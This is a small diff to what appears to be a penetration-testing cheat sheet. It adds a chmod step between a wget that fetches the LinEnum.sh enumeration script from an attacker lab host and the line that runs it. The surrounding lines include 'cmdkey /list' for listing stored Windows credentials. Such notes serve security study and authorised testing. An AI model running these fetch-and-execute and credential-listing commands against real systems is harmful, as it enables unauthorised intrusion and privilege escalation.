@@ -225,6 +225,9 @@ cmdkey /list
 wget http://10.11.0.xx/LinEnum.sh
 #warning you might get acccess denied. if so try using the /tmp directory
 #execute LinEnum.sh
+
+#make this executable
+chmod +x LinEnum.sh
 ./LinEnum.sh
 #######################################################################################
 #######################################################################################
